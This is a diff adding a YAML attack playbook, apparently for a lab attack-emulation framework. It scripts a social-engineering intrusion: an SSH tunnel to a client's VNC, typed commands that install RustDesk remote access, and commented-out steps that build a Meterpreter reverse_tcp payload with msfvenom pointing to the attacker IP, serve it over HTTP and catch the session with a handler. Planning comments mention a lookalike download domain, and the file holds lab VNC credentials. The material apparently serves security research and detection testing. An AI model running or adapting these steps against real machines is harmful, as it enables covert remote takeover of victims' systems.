@@ -1,0 +1,111 @@
+# Client is persuaded by attacker to download and setup rustdesk screensharing 
+# attacker executes commands on client machine via screensharing todownload and executes meterpreter payload
+
+vars:
+  PAYLOAD: linux/x64/meterpreter/reverse_tcp
+  LPORT: 4443
+  ATTACKMATE_IP: 192.42.1.174
+  CLIENT_IP: 192.168.50.100
+  MGMT_IP: 192.42.0.201
+  MGMT_USERNAME: aecid
+  CLIENT_VNC_PORT: 5901
+  CLIENT_VNC_USER: judy
+  CLIENT_VNC_PASSWORD: garland
+  ATTACKER_VNC_PORT: 5901
+  RUSTDESK_PACKAGE: https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb
+
+
+commands:
+  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5902 (vnc)
+  # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201
+  - type: shell
+    cmd: ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP 
+
+  - type: vnc
+    cmd: capture
+    filename: initial_screenshot.png
+    hostname: localhost
+    port: 5902
+    password: garland
+    creates_session: social_engineering
+
+  - type: vnc 
+    cmd: type 
+    input: curl -o rustdesk.deb $RUSTDESK_PACKAGE && sudo apt install -fy ./rustdesk.deb && sleep 1
+    session: social_engineering
+
+  - type: sleep
+    seconds: 60 
+
+  - type: vnc
+    cmd: capture
+    filename: post_install.png
+    creates_session: social_engineering
+
+  - type: vnc
+    cmd: type
+    input: rustdesk --set-password password
+
+
+  
+
+
+
+  # vnc connect to client via tunnel (this is "client is instructed via phone"), take screenshot
+
+  # open terminal and download rust desk package, make executable, install
+
+  # expect screens that prompt user interaction during install process + enter options (1 and 2, then press any key)
+
+  # set rustdesk password
+
+  # start rustdesk
+
+  # somehow configure via gui to use attacker IP as server ID
+
+  # get client id from rustdesk server log on attacker. regex?
+
+  # via shell command start connection from attacker machine with retrieved id and set password
+
+  # vnc connect attacker on its own screen that should now show the clients screen, open terminal, run command to download (facebock.com), make executable and execute install.sh metasploit script
+
+  # use established meterpreter session
+
+
+#  # tempfile for reverse shell payload
+#  - type: mktemp
+#    cmd: file
+#    variable: RSHELL
+#  
+#  # generate reverse shell
+#  - type: shell
+#    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKMATE_IP LPORT=$LPORT -f elf > ${RSHELL}
+#  
+#  # serve payload via http
+#  - type: webserv
+#    local_path: $RSHELL
+#    port: 8080
+#    background: True
+#
+#  # prepare reverse-shell-listener
+#  - type: msf-module
+#    creates_session: revshell
+#    cmd: exploit/multi/handler
+#    payload: $PAYLOAD
+#    payload_options:
+#      LHOST: $ATTACKMATE_IP
+#      LPORT: $LPORT
+#    background: true
+#    kill_on_exit: true
+#
+## get access to client machine to execute the malicious install.sh script
+#
+#  # run commands via reverse shell
+#  - type: msf-session
+#    stdapi: true
+#    session: revshell
+#    cmd: sysinfo
+
+
+
+  
